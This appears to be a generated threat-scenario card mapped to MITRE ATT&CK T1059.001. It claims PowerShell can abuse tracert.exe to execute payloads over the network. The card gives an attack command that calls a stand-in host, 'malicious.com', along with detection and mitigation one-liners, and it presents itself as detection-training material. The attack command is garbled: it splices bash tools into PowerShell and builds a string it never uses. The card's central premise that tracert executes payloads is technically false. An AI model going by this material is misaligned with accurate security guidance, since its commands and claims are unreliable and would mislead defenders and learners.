---
type: campaign
scenario_id: 127
tactic: Execution
technique: "T1059.001: PowerShell"
technique_id: T1059.001
tags: [campaign, lotl, execution]
---

# Using PowerShell to abuse tracert.exe for network-based payload execution.

## Threat Description
Using PowerShell to abuse tracert.exe for network-based payload execution.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Start-Process tracert.exe -ArgumentList '-h 1 $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)).malicious.com'"
```

## Detection Logic
Monitor tracert: `wmic process where name='tracert.exe' get commandline | findstr malicious`; Event ID 4688.

## Mitigation
Restrict tracert: `icacls %windir%\System32\tracert.exe /deny Everyone:RX`; Monitor DNS queries: `netsh advfirewall firewall add rule name='Log DNS' dir=out action=allow protocol=udp remoteport=53 enable=yes`.

## AI Training Prompt
Train AI to detect tracert abuse and suggest DNS monitoring.

## References
- MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
